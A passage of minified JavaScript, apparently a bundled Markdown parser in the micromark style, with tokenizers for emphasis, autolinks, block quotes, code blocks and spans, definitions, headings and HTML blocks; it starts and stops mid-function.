a)return a.type==="html"&&!t?"":a.value;if(e&&"alt"in a&&a.alt)return a.alt;if("children"in a)return cA(a.children,e,t)}return Array.isArray(a)?cA(a,e,t):""}function cA(a,e,t){const o=[];let r=-1;for(;++r<a.length;)o[r]=Cj(a[r],e,t);return o.join("")}function jO(a){return!!(a&&typeof a=="object")}const uA=document.createElement("i");function xv(a){const e="&"+a+";";uA.innerHTML=e;const t=uA.textContent;return t.charCodeAt(t.length-1)===59&&a!=="semi"||t===e?!1:t}function Zt(a,e,t,o){const r=a.length;let l=0,c;if(e<0?e=-e>r?0:r+e:e=e>r?r:e,t=t>0?t:0,o.length<1e4)c=Array.from(o),c.unshift(e,t),a.splice(...c);else for(t&&a.splice(e,t);l<o.length;)c=o.slice(l,l+1e4),c.unshift(e,0),a.splice(...c),l+=1e4,e+=1e4}function bn(a,e){return a.length>0?(Zt(a,a.length,0,e),a):e}const dA={}.hasOwnProperty;function Aj(a){const e={};let t=-1;for(;++t<a.length;)PO(e,a[t]);return e}function PO(a,e){let t;for(t in e){const r=(dA.call(a,t)?a[t]:void 0)||(a[t]={}),l=e[t];let c;if(l)for(c in l){dA.call(r,c)||(r[c]=[]);const d=l[c];qO(r[c],Array.isArray(d)?d:d?[d]:[])}}}function qO(a,e){let t=-1;const o=[];for(;++t<e.length;)(e[t].add==="after"?a:o).push(e[t]);Zt(a,0,0,o)}function Tj(a,e){const t=Number.parseInt(a,e);return t<9||t===11||t>13&&t<32||t>126&&t<160||t>55295&&t<57344||t>64975&&t<65008||(t&65535)===65535||(t&65535)===65534||t>1114111?"":String.fromCodePoint(t)}function On(a){return a.replace(/[\t\n\r ]+/g," ").replace(/^ | $/g,"").toLowerCase().toUpperCase()}const jt=rr(/[A-Za-z]/),St=rr(/[\dA-Za-z]/),RO=rr(/[#-'*+\--9=?A-Z^-~]/);function Kp(a){return a!==null&&(a<32||a===127)}const Jg=rr(/\d/),LO=rr(/[\dA-Fa-f]/),IO=rr(/[!-/:-@[-`{-~]/);function Re(a){return a!==null&&a<-2}function Ca(a){return a!==null&&(a<0||a===32)}function Qe(a){return a===-2||a===-1||a===32}const ym=rr(new RegExp("\\p{P}|\\p{S}","u")),$r=rr(/\s/);function rr(a){return e;function e(t){return t!==null&&t>-1&&a.test(String.fromCharCode(t))}}function Sl(a){const e=[];let t=-1,o=0,r=0;for(;++t<a.length;){const l=a.charCodeAt(t);let c="";if(l===37&&St(a.charCodeAt(t+1))&&St(a.charCodeAt(t+2)))r=2;else if(l<128)/[!#$&-;=?-Z_a-z~]/.test(String.fromCharCode(l))||(c=String.fromCharCode(l));else if(l>55295&&l<57344){const d=a.charCodeAt(t+1);l<56320&&d>56319&&d<57344?(c=String.fromCharCode(l,d),r=1):c=""}else c=String.fromCharCode(l);c&&(e.push(a.slice(o,t),encodeURIComponent(c)),o=t+r+1,c=""),r&&(t+=r,r=0)}return e.join("")+a.slice(o)}function oa(a,e,t,o){const r=o?o-1:Number.POSITIVE_INFINITY;let l=0;return c;function c(f){return Qe(f)?(a.enter(t),d(f)):e(f)}function d(f){return Qe(f)&&l++<r?(a.consume(f),d):(a.exit(t),e(f))}}const DO={tokenize:wO};function wO(a){const e=a.attempt(this.parser.constructs.contentInitial,o,r);let t;return e;function o(d){if(d===null){a.consume(d);return}return a.enter("lineEnding"),a.consume(d),a.exit("lineEnding"),oa(a,e,"linePrefix")}function r(d){return a.enter("paragraph"),l(d)}function l(d){const f=a.enter("chunkText",{contentType:"text",previous:t});return t&&(t.next=f),t=f,c(d)}function c(d){if(d===null){a.exit("chunkText"),a.exit("paragraph"),a.consume(d);return}return Re(d)?(a.consume(d),a.exit("chunkText"),l):(a.consume(d),c)}}const MO={tokenize:_O},pA={tokenize:kO};function _O(a){const e=this,t=[];let o=0,r,l,c;return d;function d(B){if(o<t.length){const ee=t[o];return e.containerState=ee[1],a.attempt(ee[0].continuation,f,p)(B)}return p(B)}function f(B){if(o++,e.containerState._closeFlow){e.containerState._closeFlow=void 0,r&&G();const ee=e.events.length;let ue=ee,Q;for(;ue--;)if(e.events[ue][0]==="exit"&&e.events[ue][1].type==="chunkFlow"){Q=e.events[ue][1].end;break}D(o);let w=ee;for(;w<e.events.length;)e.events[w][1].end={...Q},w++;return Zt(e.events,ue+1,0,e.events.slice(ee)),e.events.length=w,p(B)}return d(B)}function p(B){if(o===t.length){if(!r)return S(B);if(r.currentConstruct&&r.currentConstruct.concrete)return R(B);e.interrupt=!!(r.currentConstruct&&!r._gfmTableDynamicInterruptHack)}return e.containerState={},a.check(pA,v,y)(B)}function v(B){return r&&G(),D(o),S(B)}function y(B){return e.parser.lazy[e.now().line]=o!==t.length,c=e.now().offset,R(B)}function S(B){return e.containerState={},a.attempt(pA,A,R)(B)}function A(B){return o++,t.push([e.currentConstruct,e.containerState]),S(B)}function R(B){if(B===null){r&&G(),D(0),a.consume(B);return}return r=r||e.parser.flow(e.now()),a.enter("chunkFlow",{_tokenizer:r,contentType:"flow",previous:l}),L(B)}function L(B){if(B===null){x(a.exit("chunkFlow"),!0),D(0),a.consume(B);return}return Re(B)?(a.consume(B),x(a.exit("chunkFlow")),o=0,e.interrupt=void 0,d):(a.consume(B),L)}function x(B,ee){const ue=e.sliceStream(B);if(ee&&ue.push(null),B.previous=l,l&&(l.next=B),l=B,r.defineSkip(B.start),r.write(ue),e.parser.lazy[B.start.line]){let Q=r.events.length;for(;Q--;)if(r.events[Q][1].start.offset<c&&(!r.events[Q][1].end||r.events[Q][1].end.offset>c))return;const w=e.events.length;let I=w,k,j;for(;I--;)if(e.events[I][0]==="exit"&&e.events[I][1].type==="chunkFlow"){if(k){j=e.events[I][1].end;break}k=!0}for(D(o),Q=w;Q<e.events.length;)e.events[Q][1].end={...j},Q++;Zt(e.events,I+1,0,e.events.slice(w)),e.events.length=Q}}function D(B){let ee=t.length;for(;ee-- >B;){const ue=t[ee];e.containerState=ue[1],ue[0].exit.call(e,a)}t.length=B}function G(){r.write([null]),l=void 0,r=void 0,e.containerState._closeFlow=void 0}}function kO(a,e,t){return oa(a,a.attempt(this.parser.constructs.document,e,t),"linePrefix",this.parser.constructs.disable.null.includes("codeIndented")?void 0:4)}function ll(a){if(a===null||Ca(a)||$r(a))return 1;if(ym(a))return 2}function Em(a,e,t){const o=[];let r=-1;for(;++r<a.length;){const l=a[r].resolveAll;l&&!o.includes(l)&&(e=l(e,t),o.push(l))}return e}const Qg={name:"attention",resolveAll:NO,tokenize:OO};function NO(a,e){let t=-1,o,r,l,c,d,f,p,v;for(;++t<a.length;)if(a[t][0]==="enter"&&a[t][1].type==="attentionSequence"&&a[t][1]._close){for(o=t;o--;)if(a[o][0]==="exit"&&a[o][1].type==="attentionSequence"&&a[o][1]._open&&e.sliceSerialize(a[o][1]).charCodeAt(0)===e.sliceSerialize(a[t][1]).charCodeAt(0)){if((a[o][1]._close||a[t][1]._open)&&(a[t][1].end.offset-a[t][1].start.offset)%3&&!((a[o][1].end.offset-a[o][1].start.offset+a[t][1].end.offset-a[t][1].start.offset)%3))continue;f=a[o][1].end.offset-a[o][1].start.offset>1&&a[t][1].end.offset-a[t][1].start.offset>1?2:1;const y={...a[o][1].end},S={...a[t][1].start};mA(y,-f),mA(S,f),c={type:f>1?"strongSequence":"emphasisSequence",start:y,end:{...a[o][1].end}},d={type:f>1?"strongSequence":"emphasisSequence",start:{...a[t][1].start},end:S},l={type:f>1?"strongText":"emphasisText",start:{...a[o][1].end},end:{...a[t][1].start}},r={type:f>1?"strong":"emphasis",start:{...c.start},end:{...d.end}},a[o][1].end={...c.start},a[t][1].start={...d.end},p=[],a[o][1].end.offset-a[o][1].start.offset&&(p=bn(p,[["enter",a[o][1],e],["exit",a[o][1],e]])),p=bn(p,[["enter",r,e],["enter",c,e],["exit",c,e],["enter",l,e]]),p=bn(p,Em(e.parser.constructs.insideSpan.null,a.slice(o+1,t),e)),p=bn(p,[["exit",l,e],["enter",d,e],["exit",d,e],["exit",r,e]]),a[t][1].end.offset-a[t][1].start.offset?(v=2,p=bn(p,[["enter",a[t][1],e],["exit",a[t][1],e]])):v=0,Zt(a,o-1,t-o+3,p),t=o+p.length-v-2;break}}for(t=-1;++t<a.length;)a[t][1].type==="attentionSequence"&&(a[t][1].type="data");return a}function OO(a,e){const t=this.parser.constructs.attentionMarkers.null,o=this.previous,r=ll(o);let l;return c;function c(f){return l=f,a.enter("attentionSequence"),d(f)}function d(f){if(f===l)return a.consume(f),d;const p=a.exit("attentionSequence"),v=ll(f),y=!v||v===2&&r||t.includes(f),S=!r||r===2&&v||t.includes(o);return p._open=!!(l===42?y:y&&(r||!S)),p._close=!!(l===42?S:S&&(v||!y)),e(f)}}function mA(a,e){a.column+=e,a.offset+=e,a._bufferIndex+=e}const zO={name:"autolink",tokenize:UO};function UO(a,e,t){let o=0;return r;function r(A){return a.enter("autolink"),a.enter("autolinkMarker"),a.consume(A),a.exit("autolinkMarker"),a.enter("autolinkProtocol"),l}function l(A){return jt(A)?(a.consume(A),c):A===64?t(A):p(A)}function c(A){return A===43||A===45||A===46||St(A)?(o=1,d(A)):p(A)}function d(A){return A===58?(a.consume(A),o=0,f):(A===43||A===45||A===46||St(A))&&o++<32?(a.consume(A),d):(o=0,p(A))}function f(A){return A===62?(a.exit("autolinkProtocol"),a.enter("autolinkMarker"),a.consume(A),a.exit("autolinkMarker"),a.exit("autolink"),e):A===null||A===32||A===60||Kp(A)?t(A):(a.consume(A),f)}function p(A){return A===64?(a.consume(A),v):RO(A)?(a.consume(A),p):t(A)}function v(A){return St(A)?y(A):t(A)}function y(A){return A===46?(a.consume(A),o=0,v):A===62?(a.exit("autolinkProtocol").type="autolinkEmail",a.enter("autolinkMarker"),a.consume(A),a.exit("autolinkMarker"),a.exit("autolink"),e):S(A)}function S(A){if((A===45||St(A))&&o++<63){const R=A===45?S:y;return a.consume(A),R}return t(A)}}const Au={partial:!0,tokenize:BO};function BO(a,e,t){return o;function o(l){return Qe(l)?oa(a,r,"linePrefix")(l):r(l)}function r(l){return l===null||Re(l)?e(l):t(l)}}const xj={continuation:{tokenize:FO},exit:HO,name:"blockQuote",tokenize:VO};function VO(a,e,t){const o=this;return r;function r(c){if(c===62){const d=o.containerState;return d.open||(a.enter("blockQuote",{_container:!0}),d.open=!0),a.enter("blockQuotePrefix"),a.enter("blockQuoteMarker"),a.consume(c),a.exit("blockQuoteMarker"),l}return t(c)}function l(c){return Qe(c)?(a.enter("blockQuotePrefixWhitespace"),a.consume(c),a.exit("blockQuotePrefixWhitespace"),a.exit("blockQuotePrefix"),e):(a.exit("blockQuotePrefix"),e(c))}}function FO(a,e,t){const o=this;return r;function r(c){return Qe(c)?oa(a,l,"linePrefix",o.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(c):l(c)}function l(c){return a.attempt(xj,e,t)(c)}}function HO(a){a.exit("blockQuote")}const jj={name:"characterEscape",tokenize:GO};function GO(a,e,t){return o;function o(l){return a.enter("characterEscape"),a.enter("escapeMarker"),a.consume(l),a.exit("escapeMarker"),r}function r(l){return IO(l)?(a.enter("characterEscapeValue"),a.consume(l),a.exit("characterEscapeValue"),a.exit("characterEscape"),e):t(l)}}const Pj={name:"characterReference",tokenize:JO};function JO(a,e,t){const o=this;let r=0,l,c;return d;function d(y){return a.enter("characterReference"),a.enter("characterReferenceMarker"),a.consume(y),a.exit("characterReferenceMarker"),f}function f(y){return y===35?(a.enter("characterReferenceMarkerNumeric"),a.consume(y),a.exit("characterReferenceMarkerNumeric"),p):(a.enter("characterReferenceValue"),l=31,c=St,v(y))}function p(y){return y===88||y===120?(a.enter("characterReferenceMarkerHexadecimal"),a.consume(y),a.exit("characterReferenceMarkerHexadecimal"),a.enter("characterReferenceValue"),l=6,c=LO,v):(a.enter("characterReferenceValue"),l=7,c=Jg,v(y))}function v(y){if(y===59&&r){const S=a.exit("characterReferenceValue");return c===St&&!xv(o.sliceSerialize(S))?t(y):(a.enter("characterReferenceMarker"),a.consume(y),a.exit("characterReferenceMarker"),a.exit("characterReference"),e)}return c(y)&&r++<l?(a.consume(y),v):t(y)}}const fA={partial:!0,tokenize:WO},hA={concrete:!0,name:"codeFenced",tokenize:QO};function QO(a,e,t){const o=this,r={partial:!0,tokenize:ue};let l=0,c=0,d;return f;function f(Q){return p(Q)}function p(Q){const w=o.events[o.events.length-1];return l=w&&w[1].type==="linePrefix"?w[2].sliceSerialize(w[1],!0).length:0,d=Q,a.enter("codeFenced"),a.enter("codeFencedFence"),a.enter("codeFencedFenceSequence"),v(Q)}function v(Q){return Q===d?(c++,a.consume(Q),v):c<3?t(Q):(a.exit("codeFencedFenceSequence"),Qe(Q)?oa(a,y,"whitespace")(Q):y(Q))}function y(Q){return Q===null||Re(Q)?(a.exit("codeFencedFence"),o.interrupt?e(Q):a.check(fA,L,ee)(Q)):(a.enter("codeFencedFenceInfo"),a.enter("chunkString",{contentType:"string"}),S(Q))}function S(Q){return Q===null||Re(Q)?(a.exit("chunkString"),a.exit("codeFencedFenceInfo"),y(Q)):Qe(Q)?(a.exit("chunkString"),a.exit("codeFencedFenceInfo"),oa(a,A,"whitespace")(Q)):Q===96&&Q===d?t(Q):(a.consume(Q),S)}function A(Q){return Q===null||Re(Q)?y(Q):(a.enter("codeFencedFenceMeta"),a.enter("chunkString",{contentType:"string"}),R(Q))}function R(Q){return Q===null||Re(Q)?(a.exit("chunkString"),a.exit("codeFencedFenceMeta"),y(Q)):Q===96&&Q===d?t(Q):(a.consume(Q),R)}function L(Q){return a.attempt(r,ee,x)(Q)}function x(Q){return a.enter("lineEnding"),a.consume(Q),a.exit("lineEnding"),D}function D(Q){return l>0&&Qe(Q)?oa(a,G,"linePrefix",l+1)(Q):G(Q)}function G(Q){return Q===null||Re(Q)?a.check(fA,L,ee)(Q):(a.enter("codeFlowValue"),B(Q))}function B(Q){return Q===null||Re(Q)?(a.exit("codeFlowValue"),G(Q)):(a.consume(Q),B)}function ee(Q){return a.exit("codeFenced"),e(Q)}function ue(Q,w,I){let k=0;return j;function j(me){return Q.enter("lineEnding"),Q.consume(me),Q.exit("lineEnding"),_}function _(me){return Q.enter("codeFencedFence"),Qe(me)?oa(Q,z,"linePrefix",o.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(me):z(me)}function z(me){return me===d?(Q.enter("codeFencedFenceSequence"),N(me)):I(me)}function N(me){return me===d?(k++,Q.consume(me),N):k>=c?(Q.exit("codeFencedFenceSequence"),Qe(me)?oa(Q,ge,"whitespace")(me):ge(me)):I(me)}function ge(me){return me===null||Re(me)?(Q.exit("codeFencedFence"),w(me)):I(me)}}}function WO(a,e,t){const o=this;return r;function r(c){return c===null?t(c):(a.enter("lineEnding"),a.consume(c),a.exit("lineEnding"),l)}function l(c){return o.parser.lazy[o.now().line]?t(c):e(c)}}const $h={name:"codeIndented",tokenize:$O},KO={partial:!0,tokenize:YO};function $O(a,e,t){const o=this;return r;function r(p){return a.enter("codeIndented"),oa(a,l,"linePrefix",5)(p)}function l(p){const v=o.events[o.events.length-1];return v&&v[1].type==="linePrefix"&&v[2].sliceSerialize(v[1],!0).length>=4?c(p):t(p)}function c(p){return p===null?f(p):Re(p)?a.attempt(KO,c,f)(p):(a.enter("codeFlowValue"),d(p))}function d(p){return p===null||Re(p)?(a.exit("codeFlowValue"),c(p)):(a.consume(p),d)}function f(p){return a.exit("codeIndented"),e(p)}}function YO(a,e,t){const o=this;return r;function r(c){return o.parser.lazy[o.now().line]?t(c):Re(c)?(a.enter("lineEnding"),a.consume(c),a.exit("lineEnding"),r):oa(a,l,"linePrefix",5)(c)}function l(c){const d=o.events[o.events.length-1];return d&&d[1].type==="linePrefix"&&d[2].sliceSerialize(d[1],!0).length>=4?e(c):Re(c)?r(c):t(c)}}const XO={name:"codeText",previous:e3,resolve:ZO,tokenize:a3};function ZO(a){let e=a.length-4,t=3,o,r;if((a[t][1].type==="lineEnding"||a[t][1].type==="space")&&(a[e][1].type==="lineEnding"||a[e][1].type==="space")){for(o=t;++o<e;)if(a[o][1].type==="codeTextData"){a[t][1].type="codeTextPadding",a[e][1].type="codeTextPadding",t+=2,e-=2;break}}for(o=t-1,e++;++o<=e;)r===void 0?o!==e&&a[o][1].type!=="lineEnding"&&(r=o):(o===e||a[o][1].type==="lineEnding")&&(a[r][1].type="codeTextData",o!==r+2&&(a[r][1].end=a[o-1][1].end,a.splice(r+2,o-r-2),e-=o-r-2,o=r+2),r=void 0);return a}function e3(a){return a!==96||this.events[this.events.length-1][1].type==="characterEscape"}function a3(a,e,t){let o=0,r,l;return c;function c(y){return a.enter("codeText"),a.enter("codeTextSequence"),d(y)}function d(y){return y===96?(a.consume(y),o++,d):(a.exit("codeTextSequence"),f(y))}function f(y){return y===null?t(y):y===32?(a.enter("space"),a.consume(y),a.exit("space"),f):y===96?(l=a.enter("codeTextSequence"),r=0,v(y)):Re(y)?(a.enter("lineEnding"),a.consume(y),a.exit("lineEnding"),f):(a.enter("codeTextData"),p(y))}function p(y){return y===null||y===32||y===96||Re(y)?(a.exit("codeTextData"),f(y)):(a.consume(y),p)}function v(y){return y===96?(a.consume(y),r++,v):r===o?(a.exit("codeTextSequence"),a.exit("codeText"),e(y)):(l.type="codeTextData",p(y))}}class t3{constructor(e){this.left=e?[...e]:[],this.right=[]}get(e){if(e<0||e>=this.left.length+this.right.length)throw new RangeError("Cannot access index `"+e+"` in a splice buffer of size `"+(this.left.length+this.right.length)+"`");return e<this.left.length?this.left[e]:this.right[this.right.length-e+this.left.length-1]}get length(){return this.left.length+this.right.length}shift(){return this.setCursor(0),this.right.pop()}slice(e,t){const o=t??Number.POSITIVE_INFINITY;return o<this.left.length?this.left.slice(e,o):e>this.left.length?this.right.slice(this.right.length-o+this.left.length,this.right.length-e+this.left.length).reverse():this.left.slice(e).concat(this.right.slice(this.right.length-o+this.left.length).reverse())}splice(e,t,o){const r=t||0;this.setCursor(Math.trunc(e));const l=this.right.splice(this.right.length-r,Number.POSITIVE_INFINITY);return o&&Lc(this.left,o),l.reverse()}pop(){return this.setCursor(Number.POSITIVE_INFINITY),this.left.pop()}push(e){this.setCursor(Number.POSITIVE_INFINITY),this.left.push(e)}pushMany(e){this.setCursor(Number.POSITIVE_INFINITY),Lc(this.left,e)}unshift(e){this.setCursor(0),this.right.push(e)}unshiftMany(e){this.setCursor(0),Lc(this.right,e.reverse())}setCursor(e){if(!(e===this.left.length||e>this.left.length&&this.right.length===0||e<0&&this.left.length===0))if(e<this.left.length){const t=this.left.splice(e,Number.POSITIVE_INFINITY);Lc(this.right,t.reverse())}else{const t=this.right.splice(this.left.length+this.right.length-e,Number.POSITIVE_INFINITY);Lc(this.left,t.reverse())}}}function Lc(a,e){let t=0;if(e.length<1e4)a.push(...e);else for(;t<e.length;)a.push(...e.slice(t,t+1e4)),t+=1e4}function qj(a){const e={};let t=-1,o,r,l,c,d,f,p;const v=new t3(a);for(;++t<v.length;){for(;t in e;)t=e[t];if(o=v.get(t),t&&o[1].type==="chunkFlow"&&v.get(t-1)[1].type==="listItemPrefix"&&(f=o[1]._tokenizer.events,l=0,l<f.length&&f[l][1].type==="lineEndingBlank"&&(l+=2),l<f.length&&f[l][1].type==="content"))for(;++l<f.length&&f[l][1].type!=="content";)f[l][1].type==="chunkText"&&(f[l][1]._isInFirstContentOfListItem=!0,l++);if(o[0]==="enter")o[1].contentType&&(Object.assign(e,n3(v,t)),t=e[t],p=!0);else if(o[1]._container){for(l=t,r=void 0;l--;)if(c=v.get(l),c[1].type==="lineEnding"||c[1].type==="lineEndingBlank")c[0]==="enter"&&(r&&(v.get(r)[1].type="lineEndingBlank"),c[1].type="lineEnding",r=l);else if(!(c[1].type==="linePrefix"||c[1].type==="listItemIndent"))break;r&&(o[1].end={...v.get(r)[1].start},d=v.slice(r,t),d.unshift(o),v.splice(r,t-r+1,d))}}return Zt(a,0,Number.POSITIVE_INFINITY,v.slice(0)),!p}function n3(a,e){const t=a.get(e)[1],o=a.get(e)[2];let r=e-1;const l=[];let c=t._tokenizer;c||(c=o.parser[t.contentType](t.start),t._contentTypeTextTrailing&&(c._contentTypeTextTrailing=!0));const d=c.events,f=[],p={};let v,y,S=-1,A=t,R=0,L=0;const x=[L];for(;A;){for(;a.get(++r)[1]!==A;);l.push(r),A._tokenizer||(v=o.sliceStream(A),A.next||v.push(null),y&&c.defineSkip(A.start),A._isInFirstContentOfListItem&&(c._gfmTasklistFirstContentOfListItem=!0),c.write(v),A._isInFirstContentOfListItem&&(c._gfmTasklistFirstContentOfListItem=void 0)),y=A,A=A.next}for(A=t;++S<d.length;)d[S][0]==="exit"&&d[S-1][0]==="enter"&&d[S][1].type===d[S-1][1].type&&d[S][1].start.line!==d[S][1].end.line&&(L=S+1,x.push(L),A._tokenizer=void 0,A.previous=void 0,A=A.next);for(c.events=[],A?(A._tokenizer=void 0,A.previous=void 0):x.pop(),S=x.length;S--;){const D=d.slice(x[S],x[S+1]),G=l.pop();f.push([G,G+D.length-1]),a.splice(G,2,D)}for(f.reverse(),S=-1;++S<f.length;)p[R+f[S][0]]=R+f[S][1],R+=f[S][1]-f[S][0]-1;return p}const o3={resolve:r3,tokenize:s3},i3={partial:!0,tokenize:l3};function r3(a){return qj(a),a}function s3(a,e){let t;return o;function o(d){return a.enter("content"),t=a.enter("chunkContent",{contentType:"content"}),r(d)}function r(d){return d===null?l(d):Re(d)?a.check(i3,c,l)(d):(a.consume(d),r)}function l(d){return a.exit("chunkContent"),a.exit("content"),e(d)}function c(d){return a.consume(d),a.exit("chunkContent"),t.next=a.enter("chunkContent",{contentType:"content",previous:t}),t=t.next,r}}function l3(a,e,t){const o=this;return r;function r(c){return a.exit("chunkContent"),a.enter("lineEnding"),a.consume(c),a.exit("lineEnding"),oa(a,l,"linePrefix")}function l(c){if(c===null||Re(c))return t(c);const d=o.events[o.events.length-1];return!o.parser.constructs.disable.null.includes("codeIndented")&&d&&d[1].type==="linePrefix"&&d[2].sliceSerialize(d[1],!0).length>=4?e(c):a.interrupt(o.parser.constructs.flow,t,e)(c)}}function Rj(a,e,t,o,r,l,c,d,f){const p=f||Number.POSITIVE_INFINITY;let v=0;return y;function y(D){return D===60?(a.enter(o),a.enter(r),a.enter(l),a.consume(D),a.exit(l),S):D===null||D===32||D===41||Kp(D)?t(D):(a.enter(o),a.enter(c),a.enter(d),a.enter("chunkString",{contentType:"string"}),L(D))}function S(D){return D===62?(a.enter(l),a.consume(D),a.exit(l),a.exit(r),a.exit(o),e):(a.enter(d),a.enter("chunkString",{contentType:"string"}),A(D))}function A(D){return D===62?(a.exit("chunkString"),a.exit(d),S(D)):D===null||D===60||Re(D)?t(D):(a.consume(D),D===92?R:A)}function R(D){return D===60||D===62||D===92?(a.consume(D),A):A(D)}function L(D){return!v&&(D===null||D===41||Ca(D))?(a.exit("chunkString"),a.exit(d),a.exit(c),a.exit(o),e(D)):v<p&&D===40?(a.consume(D),v++,L):D===41?(a.consume(D),v--,L):D===null||D===32||D===40||Kp(D)?t(D):(a.consume(D),D===92?x:L)}function x(D){return D===40||D===41||D===92?(a.consume(D),L):L(D)}}function Lj(a,e,t,o,r,l){const c=this;let d=0,f;return p;function p(A){return a.enter(o),a.enter(r),a.consume(A),a.exit(r),a.enter(l),v}function v(A){return d>999||A===null||A===91||A===93&&!f||A===94&&!d&&"_hiddenFootnoteSupport"in c.parser.constructs?t(A):A===93?(a.exit(l),a.enter(r),a.consume(A),a.exit(r),a.exit(o),e):Re(A)?(a.enter("lineEnding"),a.consume(A),a.exit("lineEnding"),v):(a.enter("chunkString",{contentType:"string"}),y(A))}function y(A){return A===null||A===91||A===93||Re(A)||d++>999?(a.exit("chunkString"),v(A)):(a.consume(A),f||(f=!Qe(A)),A===92?S:y)}function S(A){return A===91||A===92||A===93?(a.consume(A),d++,y):y(A)}}function Ij(a,e,t,o,r,l){let c;return d;function d(S){return S===34||S===39||S===40?(a.enter(o),a.enter(r),a.consume(S),a.exit(r),c=S===40?41:S,f):t(S)}function f(S){return S===c?(a.enter(r),a.consume(S),a.exit(r),a.exit(o),e):(a.enter(l),p(S))}function p(S){return S===c?(a.exit(l),f(c)):S===null?t(S):Re(S)?(a.enter("lineEnding"),a.consume(S),a.exit("lineEnding"),oa(a,p,"linePrefix")):(a.enter("chunkString",{contentType:"string"}),v(S))}function v(S){return S===c||S===null||Re(S)?(a.exit("chunkString"),p(S)):(a.consume(S),S===92?y:v)}function y(S){return S===c||S===92?(a.consume(S),v):v(S)}}function Qc(a,e){let t;return o;function o(r){return Re(r)?(a.enter("lineEnding"),a.consume(r),a.exit("lineEnding"),t=!0,o):Qe(r)?oa(a,o,t?"linePrefix":"lineSuffix")(r):e(r)}}const c3={name:"definition",tokenize:d3},u3={partial:!0,tokenize:p3};function d3(a,e,t){const o=this;let r;return l;function l(A){return a.enter("definition"),c(A)}function c(A){return Lj.call(o,a,d,t,"definitionLabel","definitionLabelMarker","definitionLabelString")(A)}function d(A){return r=On(o.sliceSerialize(o.events[o.events.length-1][1]).slice(1,-1)),A===58?(a.enter("definitionMarker"),a.consume(A),a.exit("definitionMarker"),f):t(A)}function f(A){return Ca(A)?Qc(a,p)(A):p(A)}function p(A){return Rj(a,v,t,"definitionDestination","definitionDestinationLiteral","definitionDestinationLiteralMarker","definitionDestinationRaw","definitionDestinationString")(A)}function v(A){return a.attempt(u3,y,y)(A)}function y(A){return Qe(A)?oa(a,S,"whitespace")(A):S(A)}function S(A){return A===null||Re(A)?(a.exit("definition"),o.parser.defined.push(r),e(A)):t(A)}}function p3(a,e,t){return o;function o(d){return Ca(d)?Qc(a,r)(d):t(d)}function r(d){return Ij(a,l,t,"definitionTitle","definitionTitleMarker","definitionTitleString")(d)}function l(d){return Qe(d)?oa(a,c,"whitespace")(d):c(d)}function c(d){return d===null||Re(d)?e(d):t(d)}}const m3={name:"hardBreakEscape",tokenize:f3};function f3(a,e,t){return o;function o(l){return a.enter("hardBreakEscape"),a.consume(l),r}function r(l){return Re(l)?(a.exit("hardBreakEscape"),e(l)):t(l)}}const h3={name:"headingAtx",resolve:g3,tokenize:b3};function g3(a,e){let t=a.length-2,o=3,r,l;return a[o][1].type==="whitespace"&&(o+=2),t-2>o&&a[t][1].type==="whitespace"&&(t-=2),a[t][1].type==="atxHeadingSequence"&&(o===t-1||t-4>o&&a[t-2][1].type==="whitespace")&&(t-=o+1===t?2:4),t>o&&(r={type:"atxHeadingText",start:a[o][1].start,end:a[t][1].end},l={type:"chunkText",start:a[o][1].start,end:a[t][1].end,contentType:"text"},Zt(a,o,t-o+1,[["enter",r,e],["enter",l,e],["exit",l,e],["exit",r,e]])),a}function b3(a,e,t){let o=0;return r;function r(v){return a.enter("atxHeading"),l(v)}function l(v){return a.enter("atxHeadingSequence"),c(v)}function c(v){return v===35&&o++<6?(a.consume(v),c):v===null||Ca(v)?(a.exit("atxHeadingSequence"),d(v)):t(v)}function d(v){return v===35?(a.enter("atxHeadingSequence"),f(v)):v===null||Re(v)?(a.exit("atxHeading"),e(v)):Qe(v)?oa(a,d,"whitespace")(v):(a.enter("atxHeadingText"),p(v))}function f(v){return v===35?(a.consume(v),f):(a.exit("atxHeadingSequence"),d(v))}function p(v){return v===null||v===35||Ca(v)?(a.exit("atxHeadingText"),d(v)):(a.consume(v),p)}}const v3=["address","article","aside","base","basefont","blockquote","body","caption","center","col","colgroup","dd","details","dialog","dir","div","dl","dt","fieldset","figcaption","figure","footer","form","frame","frameset","h1","h2","h3","h4","h5","h6","head","header","hr","html","iframe","legend","li","link","main","menu","menuitem","nav","noframes","ol","optgroup","option","p","param","search","section","summary","table","tbody","td","tfoot","th","thead","title","tr","track","ul"],gA=["pre","script","style","textarea"],y3={concrete:!0,name:"htmlFlow",resolveTo:C3,tokenize:A3},E3={partial:!0,tokenize:x3},S3={partial:!0,tokenize:T3};function C3(a){let e=a.length;for(;e--&&!(a[e][0]==="enter"&&a[e][1].type==="htmlFlow"););return e>1&&a[e-2][1].type==="linePrefix"&&(a[e][1].start=a[e-2][1].start,a[e+1][1].start=a[e-2][1].start,a.splice(e-2,2)),a}function A3(a,e,t){const o=this;let r,l,c,d,f;return p;function p(M){return v(M)}function v(M){return a.enter("htmlFlow"),a.enter("htmlFlowData"),a.consume(M),y}function y(M){return M===33?(a.consume(M),S):M===47?(a.consume(M),l=!0,L):M===63?(a.consume(M),r=3,o.interrupt?e:U):jt(M)?(a.consume(M),c=String.fromCharCode(M),x):t(M)}function S(M){return M===45?(a.consume(M),r=2,A):M===91?(a.consume(M),r=5,d=0,R):jt(M)?(a.consume(M),r=4,o.interrupt?e:U):t(M)}function A(M){return M===45?(a.consume(M),o.interrupt?e:U):t(M)}function R(M){const ve="CDATA[";return M===ve.charCodeAt(d++)?(a.consume(M),d===ve.length?o.interrupt?e:z:R):t(M)}function L(M){return jt(M)?(a.consume(M),c=String.fromCharCode(M),x):t(M)}function x(M){if(M===null||M===47||M===62||Ca(M)){const ve=M===47,je=c.toLowerCase();return!ve&&!l&&gA.includes(je)?(r=1,o.interrupt?e(M):z(M)):v3.includes(c.toLowerCase())?(r=6,ve?(a.consume(M),D):o.interrupt?e(M):z(M)):(r=7,o.interrupt&&!o.parser.lazy[o.now().line]?t(M):l?G(M):B(M))}return M===45||St(M)?(a.consume(M),c+=String.fromCharCode(M),x):t(M)}function D(M){return M===62?(a.consume(M),o.interrupt?e:z):t(M)}function G(M){return Qe(M)?(a.consume(M),G):j(M)}function B(M){return M===47?(a.consume(M),j):M===58||M===95||jt(M)?(a.consume(M),ee):Qe(M)?(a.consume(M),B):j(M)}function ee(M){return M===45||M===46||M===58||M===95||St(M)?(a.consume(M),ee):ue(M)}function ue(M){return M===61?(a.consume(M),Q):Qe(M)?(a.consume(M),ue):B(M)}function 